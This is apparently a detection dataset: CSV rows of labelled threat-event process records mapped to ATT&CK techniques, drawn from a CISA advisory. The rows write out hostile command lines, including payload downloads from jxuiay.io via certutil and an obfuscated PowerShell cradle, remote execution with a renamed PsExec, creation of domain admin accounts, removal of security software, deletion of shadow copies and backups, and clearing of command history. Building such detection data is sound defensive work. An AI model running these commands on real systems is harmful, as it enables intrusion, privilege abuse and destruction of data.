+PROC-TE-121,Threat Event,TRUE,WKS121,Cmd.exe calling anomalous .BAT script in subdirectory of ProgramData,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,Cmd.exe /c “C:\ProgramData\DiskCleanup\133ngc.bat”,Execution,Command and Scripting Interpreter: Windows Command Shell,https://www.huntress.com/blog/the-hunt-for-redcurl-2,
+PROC-TE-122,Threat Event,TRUE,WKS122,DLL Tool Ingress via Certutil.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\certutil.exe,certutil.exe,certutil -f urlcache https://jxuiay.io/1873.css onedrive.dll,"Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-123,Threat Event,TRUE,WKS123,MSI Tool Ingress via Certutil.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\certutil.exe,certutil.exe,certutil -f urlcache https://jxuiay.io/1098625.msi onedriveinstaller.msi,"Command and Control
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-124,Threat Event,TRUE,WKS124,Enumerate installed drivers with driverquery.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c driverquery,"Discovery
+Execution","Device Driver Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-125,Threat Event,TRUE,WKS125,Cmd.exe being used to enumerate environment variables,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,"cmd.exe /c echo Computer: %COMPUTERNAME% & `
+echo Username: %USERNAME% & `
+echo Domain: %USERDOMAIN% & `
+echo Logon Server: %LOGONSERVER% & `
+echo DNS Domain: %USERDNSDOMAIN% & `
+echo User Profile: %USERPROFILE% & echo `
+System Root: %SYSTEMROOT%","Discovery
+Execution","System Information Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-126,Threat Event,TRUE,WKS126,System IP enumeration via ipconfig,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c ipconfig /all,"Discovery
+Execution","System Information Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-127,Threat Event,TRUE,WKS127,Enumerate file shares with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c net share,"Discovery
+Execution","Network Share Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-128,Threat Event,TRUE,WKS128,Enumerate shared files with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c net use,"Discovery
+Execution","Network Share Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-129,Threat Event,TRUE,WKS129,Enumerate network connections with netstat,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c netstat -a,"Discovery
+Execution","System Network Connections Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-130,Threat Event,TRUE,WKS130,Service enumeration with sc.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c sc query,"Discovery
+Execution","System Service Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-131,Threat Event,TRUE,WKS131,Enumerate scheduled tasks with schtasks,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c schtasks,"Discovery
+Execution","System Information Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-132,Threat Event,TRUE,WKS132,System info recon with systeminfo,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c systeminfo,"Discovery
+Execution","System Information Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-133,Threat Event,TRUE,WKS133,System version recon with ver,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c ver,"Discovery
+Execution","System Information Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-134,Threat Event,TRUE,WKS134,WMIC printer discovery,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,"cmd.exe /c wmic printer get caption,name,deviceid,drivername,portname","Discovery
+Execution","Peripheral Device Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-135,Threat Event,TRUE,WKS135,WMIC print job discovery,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c wmic printjob,"Discovery
+Execution","Peripheral Device Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-136,Threat Event,TRUE,WKS136,Remote system administration via mmc.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\mmc.exe,mmc.exe,mmc.exe compmgmt.msc /computer:10.6.6.2,"Lateral Movement
+Execution","Remote Services: Windows Remote Management
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-137,Threat Event,TRUE,WKS137,Remote Desktop (RDP) session creation via mstsc.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\mstsc.exe,mstsc.exe,mstsc.exe /v:10.6.6.2,"Lateral Movement
+Execution","Remote Services: Remote Desktop Protocol
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-138,Threat Event,TRUE,WKS138,Remote Desktop (RDP) session creation via mstsc.exe (V2),C:\Windows\System32\cmd.exe,C:\Windows\System32\mstsc.exe,mstsc.exe,mstsc.exe /v:10.6.6.2 /u:patrick /p:St@r123,"Lateral Movement
+Execution","Remote Services: Remote Desktop Protocol
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-139,Threat Event,TRUE,WKS139,PowerShell being used to execute base64 encoded command,C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,powershell -exec bypass -enc bgBlAHQAIAB1AHMAZQByAA==,"Defense Evasion
+Execution","Obfuscated Files or Information: Command Obfuscation
+Command and Scripting Interpreter: PowerShell
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-140,Threat Event,TRUE,WKS140,PowerShell download cradle obfuscated with concatenation,C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,powershell -nop -c $x = 'D' + 'Own' + 'LOa' + 'DfI' + 'le'; Invoke-Expression (New-Object Net.WebClient).$x.Invoke(http://jxuiay.io/tmvr.msi),"Command and Control 
+Execution","Ingress Tool Transfer
+Command and Scripting Interpreter: PowerShell
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-141,Threat Event,TRUE,WKS141,PowerShell executing compressed and base64 encoded commands,C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"powershell -nop -w hidden -noni -ep bypass &([scriptblock]::create((
+New-Object System.IO.StreamReader(
+New-Object System.IO.Compression.GzipStream((
+New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(
+((bgBlAHQAIAB1AHMAZQByAA==)-f'<character replacement 0>',
+'<character replacement 1>','<character replacement 2>')))),
+[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))","Defense Evasion
+Execution","Obfuscated Files or Information: Command Obfuscation
+Command and Scripting Interpreter: PowerShell
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-142,Threat Event,TRUE,WKS142,Deletion of PowerShell history file,C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,powershell Remove-Item (Get-PSReadlineOption).HistorySavePath,"Defense Evasion
+Execution","Indicator Removal: Clear Command History
+Command and Scripting Interpreter: PowerShell
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-143,Threat Event,TRUE,WKS143,Active Directory computer enumeration,C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"powershell Get-ADComputer -Filter * -Property * | Select-Object Name,OperatingSystem,OperatingSystemVersion,Description,LastLogonDate,
+logonCount,whenChanged,whenCreated,ipv4Address | Export-CSV -Path C:\Users\Public\a.csv 
+-NoTypeInformation -Encoding UTF8","Discovery
+Execution","Remote System Discovery
+Command and Scripting Interpreter: PowerShell
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-144,Threat Event,TRUE,WKS144,Renamed psexec being used to spawn taskkill on a remote system,C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,"apple.exe -accepteula -nobanner -s \\10.0.5.2 ""c:\windows\system32\taskkill.exe"" /f /im WRSA.exe","Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-145,Threat Event,TRUE,WKS145,Renamed psexec being used to run a .bat file on a remote system,C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 -c coba.bat,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-146,Threat Event,TRUE,WKS146,Renamed psexec being used to run a .bat file on a remote system (v2),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 -c openrdp.bat,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-147,Threat Event,TRUE,WKS147,Renamed psexec being used to run a .bat file on a remote system (v3),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 -c StopAllProcess.bat,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-148,Threat Event,TRUE,WKS148,Renamed psexec being used to run a .bat file on a remote system (v4),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 -c zam.bat,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-149,Threat Event,TRUE,WKS149,Renamed psexec being used to run a .bat file on a remote system (v5),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 c:\temp\x.bat,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-150,Threat Event,TRUE,WKS150,Renamed psexec being used to execute cmd.exe on a remote system,C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 cmd,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-151,Threat Event,TRUE,WKS151,Renamed psexec being used to run an executable in the root of the C drive on a remote system,C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,"apple.exe -accepteula -nobanner -s \\10.0.5.2 cmd /c ""c:\gaze.exe""","Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-152,Threat Event,TRUE,WKS152,Renamed psexec being used to copy an executable via SMB share on a remote system,C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,"apple.exe -accepteula -nobanner -s \\10.0.5.2 cmd /c ""copy \\ad02\sysvol\gaze.exe c:\gaze.exe","Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-153,Threat Event,TRUE,WKS153,Renamed psexec being used to copy an executable via SMB share on a remote system and execute it,C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,"apple.exe -accepteula -nobanner -s \\10.0.5.2 cmd /c ""copy \\ad02\sysvol\gaze.exe c:\gaze.exe && c:\gaze.exe""","Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-154,Threat Event,TRUE,WKS154,Renamed psexec being used to run a .bat file on a remote system (v6),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 -u pam -p jim123 -c coba.bat,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-155,Threat Event,TRUE,WKS155,Renamed psexec being used to run a .bat file on a remote system (v7),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 -u pam -p jim123 -c wks155/ipwho.bat,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-156,Threat Event,TRUE,WKS156,Renamed psexec being used to run a .bat file on a remote system (v8),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 -u pam -p jim123 -c openrdp.bat,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-157,Threat Event,TRUE,WKS157,Renamed psexec being used to run a .bat file on a remote system (v9),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 -u pam -p jim123 -c zam.bat,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-158,Threat Event,TRUE,WKS158,Renamed psexec being used to execute cmd.exe on a remote system (v2),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 -u pam -p jim123 cmd,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-159,Threat Event,TRUE,WKS159,Renamed psexec being used to run a .bat file on a remote system (v10),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 -u pam -p jim123 -с newuser.bat,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-160,Threat Event,TRUE,WKS160,Renamed psexec being used to run a .bat file on a remote system (v11),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 -с duooff.bat,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-161,Threat Event,TRUE,WKS161,Renamed psexec being used to run a .bat file on a remote system (v12),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 -с wks161/ipwho.bat,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-162,Threat Event,TRUE,WKS162,Renamed psexec being used to run a .bat file on a remote system (v13),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 -с newuser.bat,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-163,Threat Event,TRUE,WKS163,Renamed psexec being used to run a .bat file on a remote system (v14),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 -с removesophos.bat,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-164,Threat Event,TRUE,WKS164,Renamed psexec being used to run a .bat file on a remote system (v15),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 -с start.bat,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-165,Threat Event,TRUE,WKS165,Renamed psexec being used to run a .bat file on a remote system (v16),C:\Windows\System32\cmd.exe,C:\Users\bob\Desktop\apple.exe,apple.exe,apple.exe -accepteula -nobanner -s \\10.0.5.2 -с uninstallSophos.bat,"Lateral Movement
+Execution","Remote Services: SMB/Windows Admin Shares
+System Services: Service Execution",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-166,Threat Event,TRUE,WKS166,Domain controller enumeration via nltest.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\nltest.exe,nltest.exe,nltest /dclist:,"Discovery
+Execution","Domain Trust Discovery
+Remote System Discovery
+Command and Scripting Interpreter: PowerShell
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-167,Threat Event,TRUE,WKS167,Enumeration of domain admins with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net group ""domain admins"" /domain","Discovery
+Execution","Permission Groups Discovery: Domain Groups
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-168,Threat Event,TRUE,WKS168,Addition of a new user to domain admins with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net group ""Domain Admins"" default /add /domain","Privilege Escalation
+Persistence
+Execution","Valid Accounts: Domain Accounts
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-169,Threat Event,TRUE,WKS169,Addition of a new user to Enterprise Admins with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net group ""Enterprise Admins"" default /add /domain","Privilege Escalation
+Persistence
+Execution","Valid Accounts: Domain Accounts
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-170,Threat Event,TRUE,WKS170,Addition of a new user to Remote Desktop Users with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net group ""Remote Desktop Users"" default /add /domain","Privilege Escalation
+Persistence
+Execution","Valid Accounts: Domain Accounts
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-171,Threat Event,TRUE,WKS171,Addition of a new user to Group Policy Creator Owners with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net group ""Group Policy Creator Owners"" default /add /domain","Privilege Escalation
+Persistence
+Execution","Valid Accounts: Domain Accounts
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-172,Threat Event,TRUE,WKS172,Addition of a new user to Schema Admins with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net group ""Schema Admins"" default /add /domain","Privilege Escalation
+Persistence
+Execution","Valid Accounts: Domain Accounts
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-173,Threat Event,TRUE,WKS173,Enumeration of domain users with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,"net group ""domain users"" /domain","Discovery
+Execution","Permission Groups Discovery: Domain Groups
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-174,Threat Event,TRUE,WKS174,Activation of newly created domain user with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net user default /active:yes /domain,"Persistence
+Execution","Valid Accounts: Local Accounts
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-175,Threat Event,TRUE,WKS175,Creation of new domain user with net.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\net.exe,net.exe,net user /add default krustykrabohyeah /domain,"Persistence
+Execution","Valid Accounts: Local Accounts
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-176,Threat Event,TRUE,WKS176,User session enumeration with query.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\query.exe,query.exe,query user,"Discovery
+Execution","System Owner/User Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-177,Threat Event,TRUE,WKS177,Enablement of Restricted Admin Mode via reg.exe,C:\Windows\System32\cmd.exe,C:\windows\system32\reg.exe,reg.exe,reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0,"Lateral Movement
+Defense Evasion
+Execution","Remote Services: Remote Desktop Protocol
+Modify Registry
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-178,Threat Event,TRUE,WKS178,System info recon with systeminfo (v2),C:\Windows\System32\cmd.exe,C:\Windows\System32\systeminfo.exe,systeminfo.exe,systeminfo,"Discovery
+Execution","System Information Discovery
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-179,Threat Event,TRUE,WKS179,Deletion of shadow copies with vssadmin.exe,C:\Windows\System32\cmd.exe,C:\Windows\system32\vssadmin.exe,vssadmin.exe,vssadmin.exe Delete Shadows /all /quiet,"Impact
+Execution","Inhibit System Recovery
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-180,Threat Event,TRUE,WKS180,Vssadmin being used to resize shadow copy maximum size,C:\Windows\System32\cmd.exe,C:\Windows\system32\vssadmin.exe,vssadmin.exe,vssadmin.exe resize shadowstorage /for=C /on=C /maxsize=unbounded,"Impact
+Execution","Inhibit System Recovery
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-181,Threat Event,TRUE,WKS181,Deletion of backup related files,C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,del /s /f /q %s*.VHD %s*.bac %s*.bak %s*.wbcat %s*.bkf %sBackup*.* %sbackup*.* %s*.set %s*.win %s*.dsk,"Impact
+Execution","Inhibit System Recovery
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-182,Threat Event,TRUE,WKS182,Modification of the system firewall to allow RDP with netsh.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\netsh.exe,netsh.exe,"netsh advfirewall firewall add rule name=""rdp"" dir=in protocol=tcp localport=3389 action=allow","Defense Evasion
+Lateral Movement
+Execution","Impair Defenses: Disable or Modify System Firewall
+Remote Services: Remote Desktop Protocol
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-183,Threat Event,TRUE,WKS183,Modification of the system firewall to allow WMI with netsh.exe,C:\Windows\System32\cmd.exe,C:\Windows\System32\netsh.exe,netsh.exe,"netsh advfirewall firewall set rule group=""windows management instrumentation (wmi)"" new enable=yes","Defense Evasion
+Execution","Impair Defenses: Disable or Modify System Firewall
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
+PROC-TE-184,Threat Event,TRUE,WKS184,Enablement of RDP via reg.exe,C:\Windows\System32\cmd.exe,C:\windows\system32\reg.exe,reg.exe,"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f","Lateral Movement
+Defense Evasion
+Execution","Remote Services: Remote Desktop Protocol
+Modify Registry
+Command and Scripting Interpreter: Windows Command Shell",https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a,
